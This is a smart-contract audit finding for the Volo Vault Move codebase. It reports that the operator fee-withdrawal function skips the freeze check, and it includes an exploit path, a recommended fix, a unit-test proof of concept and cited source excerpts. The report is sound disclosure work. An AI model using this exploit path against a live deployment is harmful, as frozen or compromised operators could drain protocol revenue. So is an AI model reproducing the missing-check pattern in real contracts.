# Audit Report

## Title
Frozen Operator Bypass Allows Unauthorized Protocol Fee Withdrawal

## Summary
The Volo Vault system contains a critical authorization bypass where operators can withdraw all accumulated protocol fees without freeze mechanism enforcement. The `retrieve_deposit_withdraw_fee_operator()` function lacks the freeze status check that protects all other operator functions, allowing even frozen operators to drain protocol revenue.

## Finding Description

The vault management system implements an operator freeze mechanism to revoke permissions from malicious or underperforming operators. However, this security control is inconsistently applied, creating a bypass for protocol fee withdrawal.

**Root Cause - Missing Operation Parameter:**

The `vault_manage` module provides two fee withdrawal functions: [1](#0-0) 

Both functions call the same underlying vault method, but critically, the operator version does NOT require the `Operation` shared object as a parameter. The underlying implementation only validates version and vault status: [2](#0-1) 

**Inconsistent Security Model:**

The freeze mechanism is implemented via the `Operation.freezed_operators` table and enforced by `assert_operator_not_freezed()`: [3](#0-2) 

ALL operator functions in the `operation` module enforce this check as their first validation step. Examples include: [4](#0-3) [5](#0-4) [6](#0-5) 

Even reward manager operations enforce the freeze check: [7](#0-6) 

**The Vulnerability:**

Without the `Operation` parameter, `retrieve_deposit_withdraw_fee_operator()` cannot access the `freezed_operators` table and therefore cannot enforce the freeze check. This creates a security control bypass where frozen operators retain fee withdrawal privileges while being blocked from all other operations.

**Exploit Path:**
1. Admin creates and distributes `OperatorCap` to strategy operator
2. Protocol accumulates fees from deposits (up to 5%) and withdrawals (up to 5%)
3. Operator exhibits malicious behavior or exceeds loss tolerance
4. Admin freezes the operator via `set_operator_freezed()`
5. Frozen operator calls `vault_manage::retrieve_deposit_withdraw_fee_operator()` 
6. Function succeeds without freeze check, draining accumulated protocol revenue

## Impact Explanation

**Protocol Revenue Loss:**
The vulnerability allows complete drainage of accumulated protocol fees. Fee rates can reach up to 5% on deposits and 5% on withdrawals: [8](#0-7) 

For vaults with significant TVL and transaction volume, these accumulated fees represent substantial protocol revenue that should be under admin control.

**Security Control Bypass:**
The freeze mechanism exists specifically to revoke operator permissions. A test confirms this expected behavior: [9](#0-8) 

However, the freeze control does NOT apply to fee withdrawal, breaking the security invariant that "operator freeze is respected across all operator privileges." This undermines the entire freeze mechanism's purpose.

**Threat Scenarios:**
- Malicious operator extracts fees before detection
- Compromised operator key used to drain accumulated revenue
- Operator frozen for exceeding loss tolerance can still profit from protocol fees
- Time-sensitive attack window where admin must both freeze operator AND revoke the capability object

## Likelihood Explanation

**Direct Exploitability:**
The function is directly callable by any `OperatorCap` holder with no additional preconditions beyond vault being in normal status. Test evidence confirms operators can withdraw fees: [10](#0-9) 

**No Technical Barriers:**
- No complex transaction sequencing required
- No oracle manipulation needed  
- No race conditions or timing dependencies
- Simply call the public function with a valid `OperatorCap`

**Realistic Threat Model:**
Operators are semi-trusted roles with significant vault interaction privileges. The freeze mechanism exists precisely because operators can become malicious or compromised. The vulnerability enables these scenarios:
- Internal threat: Operator with legitimate credentials turns malicious
- External threat: Operator key compromise via phishing or infrastructure breach
- Operational conflict: Operator frozen for poor performance still extracts compensation

## Recommendation

Add the `Operation` parameter to `retrieve_deposit_withdraw_fee_operator()` and enforce the freeze check:

```move
public fun retrieve_deposit_withdraw_fee_operator<PrincipalCoinType>(
    operation: &Operation,  // Add this parameter
    cap: &OperatorCap,
    vault: &mut Vault<PrincipalCoinType>,
    amount: u64,
): Balance<PrincipalCoinType> {
    vault::assert_operator_not_freezed(operation, cap);  // Add this check
    vault.retrieve_deposit_withdraw_fee(amount)
}
```

This brings the function in line with the security model applied to all other operator functions and ensures the freeze mechanism applies consistently across all operator privileges.

## Proof of Concept

```move
#[test]
// Demonstrates that frozen operators can still withdraw protocol fees
public fun test_frozen_operator_can_withdraw_fees() {
    let mut s = test_scenario::begin(OWNER);
    let mut clock = clock::create_for_testing(s.ctx());
    
    // Setup vault and operator
    init_vault::init_vault(&mut s, &mut clock);
    init_vault::init_create_vault<SUI_TEST_COIN>(&mut s);
    
    // Accumulate some protocol fees (simulate deposits/withdrawals)
    s.next_tx(OWNER);
    {
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        let fee_coin = coin::mint_for_testing<SUI_TEST_COIN>(10_000_000, s.ctx());
        vault.deposit_withdraw_fee_collected.join(fee_coin.into_balance());
        test_scenario::return_shared(vault);
    };
    
    // Admin freezes the operator
    s.next_tx(OWNER);
    {
        let admin_cap = s.take_from_sender<AdminCap>();
        let operator_cap = s.take_from_sender<OperatorCap>();
        let mut operation = s.take_shared<Operation>();
        
        vault_manage::set_operator_freezed(
            &admin_cap,
            &mut operation,
            operator_cap.operator_id(),
            true  // Freeze operator
        );
        
        test_scenario::return_shared(operation);
        s.return_to_sender(admin_cap);
        s.return_to_sender(operator_cap);
    };
    
    // Frozen operator can STILL withdraw fees (this should fail but doesn't)
    s.next_tx(OWNER);
    {
        let operator_cap = s.take_from_sender<OperatorCap>();
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        
        let withdrawn_fees = vault_manage::retrieve_deposit_withdraw_fee_operator(
            &operator_cap,
            &mut vault,
            10_000_000  // Withdraw all accumulated fees
        );
        
        // Vulnerability: This succeeds even though operator is frozen
        assert!(withdrawn_fees.value() == 10_000_000);
        
        withdrawn_fees.destroy_for_testing();
        test_scenario::return_shared(vault);
        s.return_to_sender(operator_cap);
    };
    
    clock.destroy_for_testing();
    s.end();
}
```

The test demonstrates that a frozen operator can successfully withdraw protocol fees, bypassing the freeze mechanism that blocks all other operator operations.

### Citations

**File:** volo-vault/sources/manage.move (L142-156)
```text
public fun retrieve_deposit_withdraw_fee<PrincipalCoinType>(
    _: &AdminCap,
    vault: &mut Vault<PrincipalCoinType>,
    amount: u64,
): Balance<PrincipalCoinType> {
    vault.retrieve_deposit_withdraw_fee(amount)
}

public fun retrieve_deposit_withdraw_fee_operator<PrincipalCoinType>(
    _: &OperatorCap,
    vault: &mut Vault<PrincipalCoinType>,
    amount: u64,
): Balance<PrincipalCoinType> {
    vault.retrieve_deposit_withdraw_fee(amount)
}
```

**File:** volo-vault/sources/volo_vault.move (L30-33)
```text
const DEPOSIT_FEE_RATE: u64 = 10; // default 10bp (0.1%)
const WITHDRAW_FEE_RATE: u64 = 10; // default 10bp (0.1%)
const MAX_DEPOSIT_FEE_RATE: u64 = 500; // max 500bp (5%)
const MAX_WITHDRAW_FEE_RATE: u64 = 500; // max 500bp (5%)
```

**File:** volo-vault/sources/volo_vault.move (L380-385)
```text
public(package) fun assert_operator_not_freezed(operation: &Operation, cap: &OperatorCap) {
    let cap_id = cap.operator_id();
    // If the operator has ever been freezed, it will be in the freezed_operator map, check its value
    // If the operator has never been freezed, no error will be emitted
    assert!(!operator_freezed(operation, cap_id), ERR_OPERATOR_FREEZED);
}
```

**File:** volo-vault/sources/volo_vault.move (L1544-1557)
```text
public(package) fun retrieve_deposit_withdraw_fee<PrincipalCoinType>(
    self: &mut Vault<PrincipalCoinType>,
    amount: u64,
): Balance<PrincipalCoinType> {
    self.check_version();
    self.assert_normal();

    emit(DepositWithdrawFeeRetrieved {
        vault_id: self.vault_id(),
        amount: amount,
    });

    self.deposit_withdraw_fee_collected.split(amount)
}
```

**File:** volo-vault/sources/operation.move (L94-106)
```text
public fun start_op_with_bag<T, CoinType, ObligationType>(
    vault: &mut Vault<T>,
    operation: &Operation,
    cap: &OperatorCap,
    clock: &Clock,
    defi_asset_ids: vector<u8>,
    defi_asset_types: vector<TypeName>,
    principal_amount: u64,
    coin_type_asset_amount: u64,
    ctx: &mut TxContext,
): (Bag, TxBag, TxBagForCheckValueUpdate, Balance<T>, Balance<CoinType>) {
    vault::assert_operator_not_freezed(operation, cap);
    pre_vault_check(vault, ctx);
```

**File:** volo-vault/sources/operation.move (L381-391)
```text
public fun execute_deposit<PrincipalCoinType>(
    operation: &Operation,
    cap: &OperatorCap,
    vault: &mut Vault<PrincipalCoinType>,
    reward_manager: &mut RewardManager<PrincipalCoinType>,
    clock: &Clock,
    config: &OracleConfig,
    request_id: u64,
    max_shares_received: u256,
) {
    vault::assert_operator_not_freezed(operation, cap);
```

**File:** volo-vault/sources/operation.move (L449-460)
```text
public fun execute_withdraw<PrincipalCoinType>(
    operation: &Operation,
    cap: &OperatorCap,
    vault: &mut Vault<PrincipalCoinType>,
    reward_manager: &mut RewardManager<PrincipalCoinType>,
    clock: &Clock,
    config: &OracleConfig,
    request_id: u64,
    max_amount_received: u64,
    ctx: &mut TxContext,
) {
    vault::assert_operator_not_freezed(operation, cap);
```

**File:** volo-vault/sources/reward_manager.move (L235-241)
```text
    operation: &Operation,
    cap: &OperatorCap,
    clock: &Clock,
    with_buffer: bool, // If true, create a new reward buffer distribution for the reward type
) {
    self.check_version();
    vault::assert_operator_not_freezed(operation, cap);
```

**File:** volo-vault/tests/operation/operation.test.move (L1561-1563)
```text
#[test]
#[expected_failure(abort_code = vault::ERR_OPERATOR_FREEZED, location = vault)]
// [TEST-CASE: Should do op fail if operator is freezed.] @test-case OPERATION-012
```

**File:** volo-vault/tests/operation/manage.test.move (L381-397)
```text
    s.next_tx(OWNER);
    {
        // let admin_cap = s.take_from_sender<AdminCap>();
        let operator_cap = s.take_from_sender<OperatorCap>();
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();

        let fee_retrieved = vault_manage::retrieve_deposit_withdraw_fee_operator(
            &operator_cap,
            &mut vault,
            2_000_000,
        );
        assert!(fee_retrieved.value() == 2_000_000);

        test_scenario::return_shared(vault);
        s.return_to_sender(operator_cap);
        fee_retrieved.destroy_for_testing();
    };
```
